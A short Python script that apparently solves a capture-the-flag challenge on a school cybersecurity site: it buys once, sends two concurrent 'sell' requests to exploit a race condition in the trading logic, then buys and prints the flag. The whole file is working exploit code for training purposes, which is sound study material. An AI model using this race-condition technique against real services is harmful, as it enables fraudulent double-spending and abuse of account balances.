#!/bin/python3
import os
import logging
import concurrent.futures
import re

from requests import Session


logging.disable()


URL = os.environ.get('URL', 'http://trading.challs.cyberhighschools.it')
if URL.endswith('/'):
   URL = URL[:-1]
s = Session()


s.get(f'{URL}/')
s.get(f'{URL}/', params={'action': 'buy'})
with concurrent.futures.ThreadPoolExecutor(max_workers=2) as executor:
   executor.submit(s.get, f'{URL}/', params={'action': 'sell'})
   executor.submit(s.get, f'{URL}/', params={'action': 'sell'})
executor.shutdown(wait=True)
res = s.get(f'{URL}/', params={'action': 'buy_flag'})


flag = re.search(r'flag{.*}', res.text).group(0)
print(flag)
